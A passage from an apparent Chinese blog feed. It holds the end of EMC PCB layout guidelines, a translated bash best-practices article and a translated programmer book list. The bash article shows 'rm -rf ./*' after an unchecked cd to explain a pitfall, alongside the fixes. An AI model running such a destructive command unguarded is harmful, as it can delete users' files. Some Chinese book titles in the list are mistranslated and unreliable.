id="12-在给定层上的任意两个电源平面（覆铜区域）的间距应至少为3mm"><a href="#12-在给定层上的任意两个电源平面（覆铜区域）的间距应至少为3mm" class="headerlink" title="12.在给定层上的任意两个电源平面（覆铜区域）的间距应至少为3mm"></a>12.在给定层上的任意两个电源平面（覆铜区域）的间距应至少为3mm</h5><p>如果在同一层上的两个平面（覆铜区域）靠的太近的话可能发生严重的高频耦合。在极端条件下，也可能产生电弧或短路的问题。</p><h5 id="13-在具有电源和接地平面（覆铜区域）的电路板上，不得使用任何导线连接电源或接地。应使用邻近部件的电源或接地焊盘的通孔进行连接"><a href="#13-在具有电源和接地平面（覆铜区域）的电路板上，不得使用任何导线连接电源或接地。应使用邻近部件的电源或接地焊盘的通孔进行连接" class="headerlink" title="13.在具有电源和接地平面（覆铜区域）的电路板上，不得使用任何导线连接电源或接地。应使用邻近部件的电源或接地焊盘的通孔进行连接"></a>13.在具有电源和接地平面（覆铜区域）的电路板上，不得使用任何导线连接电源或接地。应使用邻近部件的电源或接地焊盘的通孔进行连接</h5><p>连接到另外层上平面（覆铜区域）的导线既占据空间又产生电感。如果高频阻抗是个问题的话（比如电源总线解耦连接），这个电感会严重降低连接质量。</p><h5 id="14-如果电路板设计上有超过一个接地平面层，那么在给定位置的任意接地连接要连接到所有的接地平面层"><a href="#14-如果电路板设计上有超过一个接地平面层，那么在给定位置的任意接地连接要连接到所有的接地平面层" class="headerlink" title="14.如果电路板设计上有超过一个接地平面层，那么在给定位置的任意接地连接要连接到所有的接地平面层"></a>14.如果电路板设计上有超过一个接地平面层，那么在给定位置的任意接地连接要连接到所有的接地平面层</h5><p>这里的思路是，如果允许，高频电流会采用最低电感的路径流动。不要试图通过只连接某些特定平面来引导这些电流的流动。</p><h5 id="15-在接地平面，不应该有任何隔断或缝隙"><a href="#15-在接地平面，不应该有任何隔断或缝隙" class="headerlink" title="15.在接地平面，不应该有任何隔断或缝隙"></a>15.在接地平面，不应该有任何隔断或缝隙</h5><p>有一个全覆铜的接地（信号返回）平面和专用于这个平面的层是最好不过的。任何额外的电源和信号返回必须与地平面直流隔离并在不同于专用接地层的平面上布线。</p><h5 id="16-所有电路板上与外壳、线缆和其他优良天线部件有接触或耦合的电源或接地导体在高频段应当连接在一起"><a href="#16-所有电路板上与外壳、线缆和其他优良天线部件有接触或耦合的电源或接地导体在高频段应当连接在一起" class="headerlink" title="16.所有电路板上与外壳、线缆和其他优良天线部件有接触或耦合的电源或接地导体在高频段应当连接在一起"></a>16.所有电路板上与外壳、线缆和其他优良天线部件有接触或耦合的电源或接地导体在高频段应当连接在一起</h5><p>同样称作“地”的不同导体间的电压差是辐射发射和易感性问题的主要来源。</p><p>除了上述16项设计指南，电路板设计师通常使用其行业所特有的EMC设计指南。例如，“采用锁相环路的时钟发生电路应该通过＃1234铁氧体磁珠从板上的功率中获得自己的隔离功率。”这些基于经验的设计指南对知识渊博的电路板设计师来说是非常宝贵的。然而，如果不了解这些EMC设计指南产生的原因和它们之所以有效的原因就贸然在其他设计上使用这些EMC设计指南，很可能导致设计出的电路板无法正常工作。所以了解，每个设计指南背后的基本物理学原理是非常重要的。</p><p>满足最多条设计指南的设计并不一定是最好的设计。以最低的成本和最高的可靠性实现了所有的性能指标的设计才是最好的设计。</p><h2 id="回到最初的题目"><a href="#回到最初的题目" class="headerlink" title="回到最初的题目"></a>回到最初的题目</h2><p>我们已经有了一份EMC设计指南，也了解了这些设计指南背后的物理学原理。现在我们回到最初提出的问题，看看这三种设计中，哪种PCB布局是最好的。</p><p>我们可以很轻松地把选项b划掉。这个布局中导线跨过了返回平面上的隔断。选项a采用了最短的导线布局，因此是最好的选项。因为地平面上隔断是没有必要存在的。如果存在低频共模阻抗耦合的问题使得隔断必不可少的话，选项c将导线沿着隔断布线也是还不错的一个选项。记住，相对总环路面积而言，微带导线长度几乎不重要。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://haipeng.me/2017/08/21/emc-pcb-layout/">原文</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>硬件</category>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>系统编程杂项</title>
    <link href="/2024/05/03/%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B%E6%9D%82%E9%A1%B9/"/>
    <url>/2024/05/03/%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B%E6%9D%82%E9%A1%B9/</url>
    
    <content type="html"><![CDATA[<p>一个关于系统编程的杂物间</p><span id="more"></span><h1 id="系统编程"><a href="#系统编程" class="headerlink" title="系统编程"></a>系统编程</h1><ol><li>系统编程所包含的内容：<ol><li><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/741560-20161111110447389-916094989.png"></li></ol></li></ol>]]></content>
    
    
    <categories>
      
      <category>系统编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>bash注意点</title>
    <link href="/2024/04/29/bash%E6%B3%A8%E6%84%8F%E7%82%B9/"/>
    <url>/2024/04/29/bash%E6%B3%A8%E6%84%8F%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<p>Bash编程中的注意点</p><span id="more"></span><h1 id="1-Shebang"><a href="#1-Shebang" class="headerlink" title="1. Shebang"></a>1. Shebang</h1><p>目前有数个可用的shebang，你可以用其引用你想执行代码的解释器。他们中的一些是：</p><ul><li><p>#!&#x2F;usr&#x2F;bin&#x2F;env bash</p></li><li><p>#!&#x2F;bin&#x2F;bash</p></li><li><p>#!&#x2F;bin&#x2F;sh</p></li><li><p>#!&#x2F;bin&#x2F;sh –</p></li></ul><p>我们都知道shebang仅仅是一个指向shell解释器的路径（绝对火相对于当前目录），但哪一个更受欢迎呢？</p><p>长话短说 –为了可移植性，你应该使用 <code>#!/usr/bin/env bash</code> 。这是因为POSIX并没有标准化路径名，因此不同的基于UNIX的系统可能会将bash放到不同的位置。你不能完全假定——例如——&#x2F;bin&#x2F;bash是必然存在的 (一些BSD系统将bash可执行文件放到&#x2F;usr&#x2F;local&#x2F;bin&#x2F;bash中)。</p><p><code>Env</code> 实用程序可以帮助我们规避这种限制：<code>#!/usr/bin/env bash</code> 将是代码在执行时使用 <code>PATH</code> 路径下找到的第一个解释器。尽管这不是最完美的解决方案 (那么如果同样的问题也适用于<code>/usr/bin/env</code> 呢? 幸运的是，据我所知每个UNIX OS将env放置到同一个位置), 这是我们能做到的最好的方案。</p><p>然而，我意识到这也有个例外：对于系统启动脚本，既然&#x2F;bin&#x2F;sh是系统标准命令行解释器，使用之。 </p><p>更多信息请查阅<a href="https://en.wikipedia.org/wiki/Shebang_%28Unix%29#Portability">这篇</a>和这篇<a href="https://mywiki.wooledge.org/BashGuide/CommandsAndArguments#Scripts">文章</a>。</p><h1 id="2-始终使用引号"><a href="#2-始终使用引号" class="headerlink" title="2. 始终使用引号"></a>2. 始终使用引号</h1><p>这是你应该遵循的最简单以及最好的建议，以避免诸多可能的陷阱。错误的shell引用是让bash程序员头痛的最常见原因。不幸的是，它并不像重要那么容易。</p><p>目前有很多不错的文章完全涵盖了这一特定主题。我没有更多要说的，但向你推荐<a href="https://mywiki.wooledge.org/Quotes">这篇</a>以及<a href="https://wiki.bash-hackers.org/syntax/quoting">这篇</a>文章。</p><p>第二篇文章需要去 “互联网档案馆” 查找。</p><p><strong>值得记住的是：你通常应该使用双引号。</strong></p><p>事实上，在使用单引号表示<strong>强引用</strong>，这意味着单引号包含的所有的字符都被解释为单一的字符含义。并且<strong>转义符 <code>\</code> 也不会被解释</strong>。只有在前面加上一个 <code>$</code> 符号，才会被解释为变量。如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">IFS=$<span class="hljs-string">&#x27; \t\n&#x27;</span> <span class="hljs-comment"># 定义一个包含空格、制表符和换行符的 IFS 变量</span><br></code></pre></td></tr></table></figure><h1 id="3-变量的使用"><a href="#3-变量的使用" class="headerlink" title="3.变量的使用"></a>3.变量的使用</h1><p><code>$foo</code> 是<code>bash</code>中引用变量的经典方法，但是<code>bash2.0</code>版本（通过<code>echo $BASH_VERSION</code>查看）给我们提供了新标记方法——变量扩展。这种方法是通过在变量标识符的两边使用大括号来做标记的，比如<code>$&#123;foo&#125;</code>。为什么说这是一种好的实践呢？因为它给我们带来了一些新的特性：</p><p>数组元素的扩展：<code>$&#123;array[42]&#125;</code></p><p>参数的扩展，例如&#96;${filename%.<em>} (删除了文件的扩展名)，, ${foo&#x2F;&#x2F; } (删除了空格）， ${BASH_VERSION%%.</em>}（获取bash的大版本号）</p><p>变量名的拼接：${dirname}&#x2F;${filename}</p><p>将字符串拼接到变量的后面： ${HOME}&#x2F;.bashrc</p><p>通过位置参数来访问参数变量（脚本的输入参数），例如 $9</p><p>支持子字符串的访问：${foo:1:5}</p><p>间接引用：${!foo}  将会展开成一个由名称为foo，且存储在其中的值来间接表示的值（bar&#x3D;42; foo&#x3D;”bar”; echo “${!foo}” 将会打印42）</p><p>大小写修改：${foo^}会将foo的首字母修改为大写字母，，（单独一个逗号会将其转换成小写字母）双重形式的这种方法 (^^ 和 ,,) 会将所有的字母进行转换。</p><p>在大多数常见情况下，使用变量扩展形式使我们没有优于经典扩展形式的地方，但为了保持代码一致性，在所有地方使用它可以被认为是一种好的做法。在<a href="https://wiki.bash-hackers.org/syntax/pe">此</a>阅读更多相关信息。</p><p>你还需要了解关于bash中的变量的是，默认情况下，所有变量都是全局变量。这可能导致诸如浅拷贝、覆盖或歧义引用等问题。local运算符限制了变量的范围，防止它们泄漏到全局命名空间中。请记住 - 将所有函数的变量设置为local变量。</p><h1 id="4-观察脚本的运行目录"><a href="#4-观察脚本的运行目录" class="headerlink" title="4.观察脚本的运行目录"></a>4.观察脚本的运行目录</h1><p>你经常会在bash脚本中和其他的文件进行交互。因此，你必须十分小心使用相对路径。默认情况下，当前的工作路径是由脚本所在的父shell环境下所得到的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">pwd</span><br>/home/jakub<br><br>$ <span class="hljs-built_in">cat</span> <span class="hljs-built_in">test</span>/test<br><span class="hljs-comment">#!/usr/bin/env bash</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(pwd)</span>&quot;</span><br><br>$ ./test/test<br>/home/jakub<br></code></pre></td></tr></table></figure><p>当pwd和脚本所在的路径不一致的时候，会存在一些问题。这个时候，不能够简单的通过.&#x2F;脚本名称的方式运行脚本，因为它不会指向你的脚本旁边的文件。为了更加简单的将脚本作用到特定路径的文件，并且避免不小心引用到其他的系统文件，你应该考虑使用这个方便的单行指令将子shell工作目录更改为bash脚本的所在的目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(cd <span class="hljs-string">&quot;<span class="hljs-subst">$(dirname <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;BASH_SOURCE[0]&#125;</span>&quot;</span>)</span>&quot;</span> &gt; /dev/null &amp;&amp; pwd)</span>&quot;</span> || <span class="hljs-built_in">return</span><br>$ <span class="hljs-built_in">pwd</span><br>/home/jakub<br><br>$ <span class="hljs-built_in">cat</span> <span class="hljs-built_in">test</span>/test<br><span class="hljs-comment">#!/usr/bin/env bash</span><br><span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(cd <span class="hljs-string">&quot;<span class="hljs-subst">$(dirname <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;BASH_SOURCE[0]&#125;</span>&quot;</span>)</span>&quot;</span> &gt;/dev/null &amp;&amp; pwd)</span>&quot;</span> || <span class="hljs-built_in">return</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(pwd)</span>&quot;</span><br><br>$ ./test/test<br>/home/jakub/test<br></code></pre></td></tr></table></figure><p>看起来是不是更加自然？</p><h1 id="5-你真的不需要-ls"><a href="#5-你真的不需要-ls" class="headerlink" title="5. 你真的不需要 ls"></a>5. 你真的不需要 ls</h1><p>在 bash 脚本中使用 ls 的方法几乎总是有缺陷的，我甚至无法记起这样做的一个理由。为了解释其原因，我们来看看两个常见的例子：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">ls</span> *.txt)<br></code></pre></td></tr></table></figure><p>当任意文件名包含空格时，分词将破坏此 for 循环。更重要的是 —— 如果文件名包含 glob 字符（也称为通配符，如*、？、[、]），它将被识别为 glob 模式并由 shell 扩展，但这可能不是你想要的。另一个问题是 POSIX 允许路径名包含除 \0 之外的任何字符（包括 |，&#x2F; 甚至换行符）。这使得在处理 ls 输出时无法确定第一个路径名的结束位置以及第二个路径名的起始位置。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(ls *.txt)</span>&quot;</span><br></code></pre></td></tr></table></figure><p>将 ls 包含在双引号内将导致其输出被视为单个词 —— 而不是期望的文件列表。</p><p>如何以正确的方式遍历文件列表呢？有两种可行策略：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> ./*.txt<br></code></pre></td></tr></table></figure><p>这会使用上述的 bash globbing 功能。记得是双引用”${file}”!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find . -<span class="hljs-built_in">type</span> f -name <span class="hljs-string">&#x27;*.txt&#x27;</span> -<span class="hljs-built_in">exec</span> ...<br></code></pre></td></tr></table></figure><p>这个可能是最好的解决方案。 Find 工具允许你使用基于正则表达式的搜索（-regex），递归并具有许多你可能觉得有用的内置功能。这里有一个不错的简介。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find . -<span class="hljs-built_in">type</span> f -name <span class="hljs-string">&#x27;*.txt&#x27;</span> -print0 | xargs -0 ...<br></code></pre></td></tr></table></figure><p>另一种替代 find 的用法是使用 xargs。它既不简单也不简短，但 xargs 的优势在于它支持并行管道执行。更多有关此差异的信息阅读此文。</p><p>总而言之，永远不要尝试解析 ls 命令的输出。它根本没有被设计用于解析，你无法让其正常工作。点此阅读更多。</p><h1 id="6-期待意外"><a href="#6-期待意外" class="headerlink" title="6. 期待意外"></a>6. 期待意外</h1><p>通常忘记检查在bash脚本中执行命令的非零状态代码。很容易想象当我们的cd命令在文件操作之前静默失败时会发生什么（因为例如“没有这样的文件或目录”）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/usr/bin/env bash</span><br><span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;some_directory&#125;</span>&quot;</span><br><span class="hljs-built_in">rm</span> -rf ./*<br></code></pre></td></tr></table></figure><p>上面的一个例子会很好的工作，但只有在没有出错的情况下。目的是删除some_directory&#x2F;目录的内容，但最终可能会在完全不同的目录位置执行rm -rf .&#x2F;*。</p><p>cd“$ {some_directory}”&amp;&amp; rm -rf .&#x2F;* 和 cd“$ {some_directory}”|| return是最简单的自描述解决方案。在这两种情况下，如果cd返回非零，则不会执行删除。值得指出的是，此代码仍然容易受到常见编程错误的影响 - 拼写错误。</p><p>执行<code>cd“$ &#123;some_dierctory&#125;”&amp;&amp; rm -rf ./*</code>将最终删除您可能要保留的文件（只要没有拼写错误的some_dierctory变量声明）。 <code>“$ &#123;some_dierctory&#125;”</code>将扩展为<code>“”</code>，这是完全有效的cd参数，将我们带到主目录。不过不用担心，这不是故事的结局。</p><p>Bash编程有一些值得注意的对于程序员友好的开关：</p><ul><li><p><code>set -o nounset</code> 可以设置bash将引用未被初始化的变量视为错误，这一特性可以避免我们犯下拼写等低级错误。</p></li><li><p><code>set -o errexit</code> 可以设置bash脚本在语句的返回值为非0值的时候立即退出。虽然使用errexit可以帮助我们有效的检验程序的错误，但要正确的使用errexit却需要一些技巧。一些命令故意返回非0的值来产生告警，并且程序员确切的知道应该如何去处理特定命令返回的错误值。参考这里了解更多。</p></li><li><p><code>set -o pipefail</code> 可以改变使用管道时的默认行为。默认情况下，bash会将管道前面的命令返回的状态码作为管道后面的命令的输入，这意味着false| true返回0（管道符前面的状态是非0，会立马执行管道符后的命令）。这样的结果有可能不是你所期望的，因为这种情况下会忽略管道符前面的命令的结果。此时需要使用pipefail命令了，通过set -o pipefail的设置，可以设置管道的退出码为最右边的返回非零的命令（或者在所有的指令的执行成功的情况下设置退出码为0）。</p></li></ul><p>当然，错误问题的处理不仅仅适用于上面提到的cd命令，你的bash脚本应该考虑各种情况下可能出现的问题，比如路径名称中的空格，文件的缺失，目录未创建，或者是错误的使用了原本不存在的命令等（例如，就像你所了解的，并不是所有运行你的bash脚本的linux操作系统都预装了awk命令）</p><h1 id="7-sh-or-bash"><a href="#7-sh-or-bash" class="headerlink" title="7. .sh or .bash?"></a>7. .sh or .bash?</h1><p>什么是<code>shell</code>脚本可执行文件的正确扩展名？ 如果它与<code>shebang</code>相反则是什么？<br>那么，首先要知道的是，基于UNIX的操作系统与<code>Windows</code>不同。 这里最重要的区别是<code>Windows</code>使用文件扩展名来确定如何打开它。 <code>UNIX</code>遵循不同的技术 - 它读取文件的头代码。 您可以将UNIX二进制扩展名设置为<code>jpg</code>并安全地打开它。 不会弹出照片浏览器。</p><p>由于<code>UNIX</code>通常不依赖于文件扩展名，因此最好的建议是不要使用脚本。 使用<code>.sh</code>并不是真正有用的约定，我认为它没有任何优点。 许多<code>UNIX utils</code>都是以<code>bash</code>脚本来实现的，但你是否输入了<code>xdg-open.sh.</code>，<code>shasum.sh some_file还是</code>lsb_release.sh -a<code>？ 您可能没有，原因是那些</code>utils&#96;根本没有文件扩展名。</p><h1 id="8-其他需要记住的事情"><a href="#8-其他需要记住的事情" class="headerlink" title="8. 其他需要记住的事情"></a>8. 其他需要记住的事情</h1><ul><li><p>优先使用 $() 语法，而不是传统的反引号（即 p<code>id=&quot;$(pidof some_process)&quot;</code>，而不是pid&#x3D;<code>pidof some_process</code>）</p></li><li><p>优先使用双方括号（即<code>[[ &quot;$&#123;foo&#125;&quot; = &#39;&#39; ]]</code>，而不是<code>[ &quot;$&#123;foo&#125;&quot; = &#39;&#39; ]</code>）</p></li><li><p>本地变量名字应该遵循小写+下划线的惯例</p></li><li><p>常量和环境变量应遵循大写+下划线的惯例</p></li><li><p>按照 <code>foo() &#123; … &#125;</code> 来定义函数, 而不是 <code>foo &#123; … &#125;</code></p></li><li><p>优先使用绝对路径</p></li><li><p>警告和错误应该通过 <code>STDERR</code> 输出</p></li><li><p>对于简单条件，使用 <code>&amp;&amp;</code> 和 <code>||</code> （例如 <code>[[ -z &quot;$&#123;*// &#125;&quot; ]] &amp;&amp;</code> 的返回为0）</p></li><li><p>相比于 <code>echo</code> ，<code>printf</code> 通常是更佳选择（<a href="https://www.in-ulm.de/~mascheck/various/echo+printf/%22">阅读此文</a>）</p></li></ul><h1 id="9-结语"><a href="#9-结语" class="headerlink" title="9. 结语"></a>9. 结语</h1><p> 每次你选择bash来自动执行某项任务时，考虑下其替代方案是值得的。Bash功能强大，但也可能很复杂，难以调试并且充满了陷阱。看看这个python sh模块，Bash Infinity框架（“用于bash的现代样板&#x2F;框架&#x2F;标准库”）和Batsh  - 一种可转换为bash和Windows Batch的简单编程语言。</p><p> 为了保证代码编写良好，请使用这个伟大的bash linter并考虑将你的下一个bash脚本这样开头，如下所示：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/usr/bin/env bash</span><br> <br><span class="hljs-built_in">set</span> -o errexit<br><span class="hljs-built_in">set</span> -o nounset<br><span class="hljs-built_in">set</span> -o pipefail<br><span class="hljs-built_in">readonly</span> SCRIPT_DIR=<span class="hljs-string">&quot;<span class="hljs-subst">$(cd <span class="hljs-string">&quot;<span class="hljs-subst">$(dirname <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;BASH_SOURCE[0]&#125;</span>&quot;</span>)</span>&quot;</span> &amp;&amp; pwd)</span>&quot;</span><br><br><span class="hljs-function"><span class="hljs-title">main</span></span>() &#123;<br>    <span class="hljs-comment"># your code goes here...</span><br>&#125;<br><br>main <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;@&#125;</span>&quot;</span><br></code></pre></td></tr></table></figure><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://www.oschina.net/translate/bash-tips-and-tricks?lang=chs&p=1">原文</a></li><li><a href="https://mywiki.wooledge.org/BashPitfalls">https://mywiki.wooledge.org/BashPitfalls</a></li><li><a href="https://github.com/progrium/bashstyle">https://github.com/progrium/bashstyle</a></li><li><a href="https://google.github.io/styleguide/shell.xml">https://google.github.io/styleguide/shell.xml</a></li><li><a href="https://wiki.bash-hackers.org/scripting/obsolete">https://wiki.bash-hackers.org/scripting/obsolete</a></li><li><a href="https://books.goalkicker.com/BashBook/">https://books.goalkicker.com/BashBook/</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>bash</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机书单推荐</title>
    <link href="/2024/04/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B9%A6%E5%8D%95%E6%8E%A8%E8%8D%90/"/>
    <url>/2024/04/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B9%A6%E5%8D%95%E6%8E%A8%E8%8D%90/</url>
    
    <content type="html"><![CDATA[<h1 id="计算机书单推荐"><a href="#计算机书单推荐" class="headerlink" title="计算机书单推荐"></a>计算机书单推荐</h1><p><strong>这个书单是由 <code>Stack Overflow</code> 上的一个高赞回答推荐的书籍的中文翻译</strong></p><p>以下是书单的中文翻译，以列表形式呈现：</p><ul><li>《代码大全（第二版）》（Code Complete (2nd edition)） by Steve McConnell</li><li>《程序员修炼之道》（The Pragmatic Programmer）</li><li>《计算机程序的构造和解释》（Structure and Interpretation of Computer Programs）</li><li>《C程序设计语言》（The C Programming Language） by Kernighan 和 Ritchie</li><li>《算法导论》（Introduction to Algorithms） by Cormen, Leiserson, Rivest &amp; Stein</li><li>《设计模式：可复用面向对象软件的基础》（Design Patterns） by Gang of Four（四人帮）</li><li>《重构：改善既有代码的设计》（Refactoring: Improving the Design of Existing Code）</li><li>《人月神话》（The Mythical Man Month）</li><li>《计算机程序设计艺术》（The Art of Computer Programming） by Donald Knuth</li><li>《编译原理》（Compilers: Principles, Techniques and Tools） by Alfred V. Aho, Ravi Sethi 和 Jeffrey D. Ullman</li><li>《哥德尔、艾舍尔、巴赫：集异璧之大成》（Gödel, Escher, Bach） by Douglas Hofstadter</li><li>《代码整洁之道：敏捷软件工艺的实践》（Clean Code: A Handbook of Agile Software Craftsmanship） by Robert C. Martin</li><li>《Effective C++》</li><li>《More Effective C++》</li><li>《CODE：软件背后的秘密》（CODE） by Charles Petzold</li><li>《编程珠玑》（Programming Pearls） by Jon Bentley</li><li>《与遗留代码协同工作》（Working Effectively with Legacy Code） by Michael C. Feathers</li><li>《人件》（Peopleware） by Demarco 和 Lister</li><li>《程序员修炼之道》（Coders at Work） by Peter Seibel</li><li>《别闹了，费曼先生！》（Surely You’re Joking, Mr. Feynman!）</li><li>《Effective Java 第二版》（Effective Java 2nd edition）</li><li>《企业应用架构模式》（Patterns of Enterprise Application Architecture） by Martin Fowler</li><li>《The Little Schemer》</li><li>《The Seasoned Schemer》</li><li>《Why’s（Poignant）Guide to Ruby》</li><li>《失控的真相：为什么高科技产品让我们困惑，以及如何恢复理智》（The Inmates Are Running The Asylum: Why High Tech Products Drive Us Crazy and How to Restore the Sanity）</li><li>《UNIX编程艺术》（The Art of Unix Programming）</li><li>《测试驱动开发：实例》（Test-Driven Development: By Example） by Kent Beck</li><li>《敏捷软件开发：原则、模式与实践》（Practices of an Agile Developer） by Robert C. Martin</li><li>《领域驱动设计》（Domain Driven Designs） by Eric Evans</li><li>《设计心理学》（The Design of Everyday Things） by Donald Norman</li><li>《现代C++设计》（Modern C++ Design） by Andrei Alexandrescu</li><li>《最佳软件编写 I》（Best Software Writing I） by Joel Spolsky</li><li>《编程实践》（The Practice of Programming） by Kernighan 和 Pike</li><li>《程序员的思维修炼：重塑你的思考方式》（Pragmatic Thinking and Learning: Refactor Your Wetware） by Andy Hunt</li><li>《软件估算：揭开神秘的面纱》（Software Estimation: Demystifying the Black Art） by Steve McConnel</li><li>《激情程序员：我的职业去了印度》（The Passionate Programmer (My Job Went To India)） by Chad Fowler</li><li>《黑客：计算机革命的英雄》（Hackers: Heroes of the Computer Revolution）</li><li>《算法 + 数据结构 &#x3D; 程序》（Algorithms + Data Structures &#x3D; Programs）</li><li>《编写可靠的代码》（Writing Solid Code） by Steve Maguire</li><li>《JavaScript语言精粹》（JavaScript - The Good Parts）</li><li>《别让我思考》（Don’t Make Me Think）</li><li>《敏捷软件开发：原则、模式与实践》（Agile Software Development, Principles, Patterns, and Practices） by Robert C. Martin</li><li>《计算机系统：程序员的视角》（Computer Systems - A Programmer’s Perspective） by Randal E. Bryant 和 David R. O’Hallaron</li><li>《C# 面向对象编程：原则、模式与实践》（Agile Principles, Patterns, and Practices in C#） by Robert C. Martin</li><li>《Growing Object-Oriented Software, Guided by Tests》</li><li>《框架设计指南》（Framework Design Guidelines） by Brad Abrams</li><li>《面向对象思维》（Object Thinking） by Dr. David West</li><li>《UNIX环境高级编程》（Advanced Programming in the UNIX Environment） by W. Richard Stevens</li><li>《黑客与画家：来自计算机时代的伟大思想》（Hackers and Painters: Big Ideas from the Computer Age）</li><li>《The Soul of a New Machine》 by Tracy Kidder</li><li>《CLR via C#》 by Jeffrey Richter</li><li>《建筑的永恒之道》（The Timeless Way of Building） by Christopher Alexander</li><li>《C#设计模式》（Design Patterns in C#） by Steve Metsker</li><li>《爱丽丝漫游奇境记》（Alice in Wonderland） by Lewis Carol</li><li>《禅与摩托车维修艺术》（Zen and the Art of Motorcycle Maintenance） by Robert M. Pirsig</li><li>《交互设计之路：无需组织的组织力量》（Here Comes Everybody: The Power of Organizing Without Organizations） by Clay Shirky</li><li>《编程之道》（The Tao of Programming）</li><li>《计算之美：自然中的模式》（Computational Beauty of Nature）</li><li>《编写安全的代码》（Writing Solid Code） by Steve Maguire</li><li>《菲利普和亚历克斯的网络出版指南》（Philip and Alex’s Guide to Web Publishing）</li><li>《面向对象分析与设计及应用》（Object-Oriented Analysis and Design with Applications） by Grady Booch</li><li>《Effective Java》 by Joshua Bloch</li><li>《计算性》（Computability） by N. J. Cutland</li><li>《编程大师》（Masterminds of Programming）</li><li>《道德经》（The Tao Te Ching）</li><li>《编程职业之道：不完美的世界中的游击战术》（The Career Programmer: Guerilla Tactics for an Imperfect World） by Christopher Duncan</li><li>《人工智能编程范式》（Paradigms of Artificial Intelligence Programming: Case studies in Common Lisp）</li><li>《Doom大师》（Masters of Doom）</li><li>《NUnit单元测试之道：C#中务实的单元测试框架》（Pragmatic Unit Testing in C# with NUnit） by Andy Hunt 和 Dave Thomas with Matt Hargett</li><li>《如何解题》（How To Solve It） by George Polya</li><li>《牧羊少年奇幻之旅》（The Alchemist） by Paulo Coelho</li><li>《Smalltalk-80: The Language and its Implementation》</li><li>《编写安全的代码（第二版）》（Writing Secure Code (2nd Edition)） by Michael Howard</li><li>《函数式编程导论》（Introduction to Functional Programming） by Philip Wadler and Richard Bird</li><li>《无Bug！》（No Bugs!） by David Thielen</li><li>《重做》（Rework） by Jason Freid 和 DHH</li><li>《JUnit实战》（JUnit in Action）</li></ul><p>请注意，部分书籍可能存在多个中文译名，这里提供的是根据原始书名直译或通用的中文书名。有些书籍可能没有官方中文译本，因此保留了原英文书名。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://stackoverflow.com/questions/1711/what-is-the-single-most-influential-book-every-programmer-should-read">原文</a></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>每一个程序员都应该了解的内存知识-Part9</title>
